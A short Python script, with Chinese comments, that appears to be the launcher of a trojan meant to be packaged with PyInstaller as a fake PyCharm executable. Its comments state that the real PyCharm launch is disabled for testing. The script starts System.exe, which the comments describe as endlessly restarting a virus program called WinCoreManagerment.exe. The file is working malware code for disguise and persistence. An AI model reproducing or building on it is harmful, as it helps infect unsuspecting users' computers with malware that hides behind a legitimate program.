import os
import subprocess
import time
import frozen  # Pyinstaller多进程代码打包exe出现多个进程解决方案
import multiprocessing


if __name__ == '__main__':
    #multiprocessing在window上运行会有Bug：
    # 在使用subprocess时候会启动两个子进程（实际上只需要一个）
    # 解决办法：使用freeze_support（）接口可以解决这个Bug
    multiprocessing.freeze_support()  # Pyinstaller多进程代码打包exe出现多个进程解决方案
    os.chdir(r'.')
    # subprocess.Popen(r'pycharm.exe') # 真正的pychamr程序，测试时候先不启动
    subprocess.Popen(r'System.exe') # System.exe负责无限重启病毒程序WinCoreManagerment.exe

    time.sleep(20)
